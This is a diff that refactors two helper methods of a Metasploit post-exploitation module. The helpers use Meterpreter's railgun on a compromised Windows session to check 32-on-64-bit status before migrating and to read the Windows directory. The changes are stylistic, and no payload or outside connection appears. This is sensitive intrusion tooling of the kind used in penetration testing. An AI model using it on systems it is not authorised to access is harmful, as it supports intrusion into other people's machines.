@@ -48,23 +48,21 @@ class MetasploitModule < Msf::Post
   end
 
   def check_32_on_64
-    begin
-      apicall = session.railgun.kernel32.IsWow64Process(-1, 4)["Wow64Process"]
-      # railgun returns '\x00\x00\x00\x00' if the meterpreter process is 64bits.
-      if apicall == "\x00\x00\x00\x00"
-        migrate = false
-      else
-        migrate = true
-      end
-      return migrate
-    rescue
-      print_error('Railgun not available, this module only works for binary meterpreters.')
+    apicall = session.railgun.kernel32.IsWow64Process(-1, 4)['Wow64Process']
+    # railgun returns '\x00\x00\x00\x00' if the meterpreter process is 64bits.
+    if apicall == "\x00\x00\x00\x00"
+      migrate = false
+    else
+      migrate = true
     end
+    return migrate
+  rescue StandardError
+    print_error('Railgun not available, this module only works for binary meterpreters.')
   end
 
   def get_windows_loc
-    apicall = session.railgun.kernel32.GetEnvironmentVariableA("Windir", 255, 255)["lpBuffer"]
-    windir = apicall.split(":")[0]
+    apicall = session.railgun.kernel32.GetEnvironmentVariableA('Windir', 255, 255)['lpBuffer']
+    windir = apicall.split(':')[0]
     return windir
   end
 
